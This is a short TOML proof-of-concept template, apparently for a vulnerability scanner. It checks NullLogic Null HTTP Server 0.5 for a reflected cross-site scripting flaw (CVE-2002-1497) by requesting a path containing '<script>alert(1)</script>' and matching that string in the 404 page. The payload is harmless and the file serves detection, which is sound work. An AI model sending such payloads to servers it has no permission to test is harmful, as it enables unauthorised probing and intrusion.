[info]
author = "ave"
description = "向服务器发送包含脚本标签的恶意路径请求，服务器在404错误页面中直接反射该内容，未进行任何过滤或转义，导致跨站脚本漏洞。"
id = "POC-AVE-2002-0615"
name = "NullLogic Null HTTP Server 0.5 XSS PoC"
severity = "medium"
tags = ["ave-2002-0615"]
vuln_id = [
    "CVE-2002-1497",
    "AVE-2002-0615",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/<script>alert(1)</script>"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert(1)</script>"]
